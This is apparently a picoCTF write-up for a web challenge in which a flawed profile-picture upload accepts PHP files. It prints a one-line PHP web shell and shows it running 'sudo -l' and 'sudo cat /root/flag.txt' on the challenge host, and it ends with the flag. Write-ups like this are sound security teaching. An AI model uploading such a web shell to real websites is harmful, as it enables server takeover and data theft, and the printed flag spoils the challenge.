## Challenge Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission is to navigate to the provided web page and locate the file upload area. The ultimate goal is to find the hidden flag located in the `/root` directory.

## Solution Steps

1. **Locate the File Upload Area**  
   Visit the challenge website and find the file upload section.

2. **Upload a Malicious PHP Script**  
   Prepare a PHP script that allows command execution:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Upload this file as `script.php`.

3. **Test Command Execution**  
   Access the uploaded script and test if you can run system commands:
   ```
   http://standard-pizzas.picoctf.net:57439/uploads/script.php?cmd=sudo%20-l
   ```
   Output:
   ```
   Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   User www-data may run the following commands on challenge:
   (ALL) NOPASSWD: ALL
   ```
   This confirms that the `www-data` user can run any command with sudo without a password.

4. **Read the Flag File**  
   Use the script to read the flag in `/root/flag.txt`:
   ```
   http://standard-pizzas.picoctf.net:57439/uploads/script.php?cmd=sudo%20cat%20/root/flag.txt
   ```
   Output:
   ```
   picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}
   ```

## Flag
```
picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}
```
